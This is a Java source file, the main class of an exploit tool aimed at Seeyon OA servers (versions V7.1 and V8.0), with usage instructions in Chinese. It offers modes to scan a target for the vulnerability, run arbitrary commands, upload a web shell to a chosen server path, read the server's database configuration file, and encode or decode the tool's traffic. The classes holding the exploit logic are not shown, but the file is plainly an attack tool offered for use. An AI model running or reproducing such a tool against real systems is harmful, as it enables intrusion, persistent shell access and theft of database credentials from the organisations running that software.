public class ExpMain {
    public static void main(String args[]) throws Exception {
        if (args.length == 2 && !args[1].equals("dataConf") && !args[0].equals("scan") && !args[0].equals("encode") && !args[0].equals("decode")) {
            System.out.println("[*]正在执行......, 漏洞影响版本：V7.1、V8.0");
            new ExecuteCode().ExecuteCode(args[0],args[1]);
        } else if (args.length == 2 && args[1].equals("dataConf")) {
            System.out.println("[*]正在执行......, 漏洞影响版本：V7.1、V8.0");
            new DataConf().DataConf(args[0]);
        } else if (args.length == 4 && args[1].equals("shell")) {
            System.out.println("[*]正在执行......, 漏洞影响版本：V7.1、V8.0");
            new UploadShell().UploadShell(args[0],args[2],args[3]);
        } else if (args.length == 2 && args[0].equals("scan")){
            System.out.println("[*]正在执行......, 漏洞影响版本：V7.1、V8.0");
            if (args[1].contains("http:") || args[1].contains("https:")){
                VersionRecognition versionRecognition = new VersionRecognition();
                versionRecognition.VersionRecognition(args[1]);
            }
        }else if (args.length == 2 && args[0].equals("encode")){
            System.out.println("ciphertext：\n" +new Encoder().Encoder(args[1]));
        }else if (args.length == 2 && args[0].equals("decode")){
            System.out.println("Plaintext：\n" +new Decoder().Decoder(args[1]));
        }else {
            System.out.println("[*]使用说明：\n" +
                    "[*]无损检验是否存在漏洞：scan http/https://xxxx.com:port/seeyon \n"+
                    "[*]执行命令：http/https://xxxx.com:port/seeyon cmd\n" +
                    "[*]写入shell：http/https://xxxx.com:port/seeyon  shell srcFile desFile，第三个参数为本地的shell文件，第四个参数为写入服务器的文件名\n" +
                    "[*]读取数据库配置文件：http/https://xxxx.com:port/seeyon dataConf\n" +
                    "[*]流量解码：decode ciphertext\n"+
                    "[*]流量编码：encode Plaintext\n");
            System.exit(0);
        }
    }
}

